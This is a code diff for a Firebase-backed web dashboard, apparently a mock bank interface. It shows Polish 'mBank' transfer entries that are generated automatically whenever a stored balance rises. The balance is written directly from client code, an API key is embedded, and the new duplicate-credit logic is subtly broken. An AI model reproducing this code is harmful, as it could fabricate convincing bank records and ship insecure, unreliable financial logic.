@@ -1424,7 +1424,7 @@
 <!-- ========== SCRIPTS ========== -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-  import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+  import { getDatabase, ref, get, onValue, update, push, set, runTransaction } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
@@ -1590,7 +1590,7 @@
     return prefix + Math.floor(1000000000 + Math.random() * 9000000);
   }
 
-  // Ajout d'une transaction dans Firebase
+  // Ajout d'une transaction dans Firebase (crédit ou débit)
   function addHistory(data) {
     if (!data.amount || data.amount === 0) return;
     if (!data.id) data.id = genId(data.amount >= 0 ? 'CR' : 'DE');
@@ -1602,16 +1602,17 @@
     if (!data.date) data.date = now.toLocaleDateString('pl-PL');
 
     if (user && user._id) {
-      push(ref(db, 'clients/' + user._id + '/history'), data)
-        .catch(err => console.error('Firebase push error:', err));
+      return push(ref(db, 'clients/' + user._id + '/history'), data)
+        .then(() => data.id)
+        .catch(err => { console.error('Firebase push error:', err); return null; });
     }
+    return Promise.resolve(null);
   }
 
   // ===== CHARGEMENT DE L'HISTORIQUE =====
   async function initHistoryListener(userId) {
     if (historyListener) historyListener();
 
-    // Chargement initial
     try {
       const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
       if (snapshot.exists()) {
@@ -1628,7 +1629,6 @@
       renderHistory([]);
     }
 
-    // Écoute en temps réel
     historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
       const val = snap.val();
       if (val) {
@@ -1642,42 +1642,76 @@
     });
   }
 
-  // ===== SURVEILLANCE DU SOLDE EN TEMPS RÉEL =====
+  // ===== SURVEILLANCE DU SOLDE EN TEMPS RÉEL (avec transaction atomique) =====
   function watchBalance(userId) {
     if (balanceListener) balanceListener();
     balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
       const newMontant = snap.val();
-      if (newMontant !== null && newMontant !== undefined) {
-        const oldMontant = user ? user.montant : 0;
-        user.montant = Number(newMontant);
-        const balElement = document.getElementById('bal');
-        const statBalElement = document.getElementById('stat-balance');
-        updateBalanceDisplay(balElement, statBalElement, user.montant);
-        document.getElementById('bal2').textContent = fmt(user.montant);
-        document.getElementById('accinfo').innerHTML = buildProfile(user);
+      if (newMontant === null || newMontant === undefined) return;
 
-        // Si le montant a augmenté, on ajoute une transaction (crédit)
-        if (newMontant > oldMontant) {
-          const diff = newMontant - oldMontant;
-          // Vérifier si cette augmentation n'a pas déjà été enregistrée récemment
-          const lastTx = currentHistory.length > 0 ? currentHistory.reduce((a, b) => a.timestamp > b.timestamp ? a : b) : null;
-          if (!lastTx || Math.abs(lastTx.amount - diff) > 0.01 || (Date.now() - lastTx.timestamp) > 2000) {
+      const oldMontant = user ? user.montant : 0;
+      user.montant = Number(newMontant);
+      const balElement = document.getElementById('bal');
+      const statBalElement = document.getElementById('stat-balance');
+      updateBalanceDisplay(balElement, statBalElement, user.montant);
+      document.getElementById('bal2').textContent = fmt(user.montant);
+      document.getElementById('accinfo').innerHTML = buildProfile(user);
+
+      // Si le montant a augmenté, on tente de créer une transaction de crédit de manière atomique
+      if (newMontant > oldMontant) {
+        const diff = newMontant - oldMontant;
+        // Utiliser une transaction Firebase pour éviter les doublons
+        const userRef = ref(db, 'clients/' + userId);
+        runTransaction(userRef, (currentData) => {
+          if (currentData === null) return currentData;
+          // On vérifie si on a déjà traité cette augmentation
+          const lastProcessed = currentData.lastProcessedCredit || null;
+          // On vérifie aussi si la dernière transaction de crédit dans l'historique correspond
+          // Pour simplifier, on va stocker l'ID de la transaction créée
+          // Si lastProcessed est null, on va créer une transaction
+          if (lastProcessed === null) {
+            // On va créer une transaction et mettre à jour lastProcessedCredit
+            // On ne peut pas faire push dans une transaction, donc on va planifier la création après
+            // Mais pour l'atomicité, on va marquer qu'on va traiter cette augmentation
+            // On peut stocker un timestamp de l'augmentation, mais on va utiliser une approche différente :
+            // On va créer la transaction après la transaction, en s'assurant que lastProcessedCredit est mis à jour.
+            // Ici, on va simplement définir un flag "pendingCredit" avec la valeur diff et le timestamp
+            currentData.pendingCredit = diff;
+            currentData.pendingTimestamp = Date.now();
+            return currentData;
+          }
+          // Si lastProcessed est déjà défini, on ne fait rien
+          return currentData;
+        }).then((result) => {
+          if (result.committed && result.snapshot.val() && result.snapshot.val().pendingCredit) {
+            // On a un pendingCredit, on crée la transaction et on met à jour lastProcessedCredit
+            const pendingAmount = result.snapshot.val().pendingCredit;
             const now = new Date();
             const tx = {
               id: genId('CR'),
               title: 'Przelew otrzymany',
               subtitle: 'mBank',
-              amount: diff,
+              amount: pendingAmount,
               beneficiary: 'mBank',
               iban: '-',
               date: now.toLocaleDateString('pl-PL'),
               time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
               timestamp: now.getTime()
             };
-            addHistory(tx);
-            toast(`+${fmt(diff)}`);
+            // Créer la transaction dans l'historique
+            push(ref(db, 'clients/' + userId + '/history'), tx)
+              .then((newRef) => {
+                // Mettre à jour lastProcessedCredit avec l'ID de la nouvelle transaction
+                update(ref(db, 'clients/' + userId), {
+                  lastProcessedCredit: tx.id,
+                  pendingCredit: null,
+                  pendingTimestamp: null
+                });
+                toast(`+${fmt(pendingAmount)}`);
+              })
+              .catch(err => console.error('Erreur push crédit:', err));
           }
-        }
+        }).catch(err => console.error('Transaction error:', err));
       }
     });
   }
@@ -1701,17 +1735,16 @@
 
       // Gestion du reset (historyReset)
       if (data.historyReset) {
-        // On récupère la dernière valeur de reset connue
         const key = 'floa_' + user.email.toLowerCase();
         const stored = JSON.parse(localStorage.getItem(key) || '{}');
         if (!stored.lastReset || data.historyReset > stored.lastReset) {
-          // Réinitialisation : on met le montant à 0, on vide l'historique dans Firebase
+          // Réinitialisation : on met le montant à 0, on vide l'historique
           update(ref(db, 'clients/' + userId), { montant: 0 });
           set(ref(db, 'clients/' + userId + '/history'), null)
             .then(() => {
-              // Mise à jour du cache local
+              // On reset aussi lastProcessedCredit
+              update(ref(db, 'clients/' + userId), { lastProcessedCredit: null, pendingCredit: null, pendingTimestamp: null });
               localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
-              // Mise à jour de l'affichage
               user.montant = 0;
               const balElement = document.getElementById('bal');
               const statBalElement = document.getElementById('stat-balance');
@@ -1885,7 +1918,6 @@
     updateNotifBadge();
     document.getElementById('accinfo').innerHTML = buildProfile(user);
 
-    // Initialiser les écouteurs
     await initHistoryListener(fid);
     watchBalance(fid);
     watchClientStatus(fid);
@@ -1996,10 +2028,8 @@
           const newMontant = Number(user.montant) - amt;
           user.montant = newMontant;
 
-          // Mettre à jour le solde dans Firebase
           update(ref(db, 'clients/' + user._id), { montant: newMontant })
             .then(() => {
-              // Ajouter la transaction de débit
               const now = new Date();
               const tx = {
                 id: genId('DE'),
@@ -2017,7 +2047,6 @@
             })
             .catch(err => console.error(err));
 
-          // Mettre à jour l'affichage immédiatement
           const balElement = document.getElementById('bal');
           const statBalElement = document.getElementById('stat-balance');
           updateBalanceDisplay(balElement, statBalElement, user.montant);
@@ -2098,16 +2127,18 @@
     });
   }
 
+  // ===== RAFRAÎCHISSEMENT AUTOMATIQUE (toutes les secondes) =====
+  setInterval(() => {
+    if (user && document.getElementById('dashboard').classList.contains('active')) {
+      adjustAllTexts();
+      // On peut aussi forcer un re-render de l'historique si nécessaire, mais les écouteurs le font déjà.
+    }
+  }, 1000);
+
   // ===== INIT =====
   window.addEventListener('resize', () => {
     adjustAllTexts();
   });
-
-  setInterval(() => {
-    if (user && document.getElementById('dashboard').classList.contains('active')) {
-      adjustAllTexts();
-    }
-  }, 3000);
 
   setTimeout(() => {
     document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
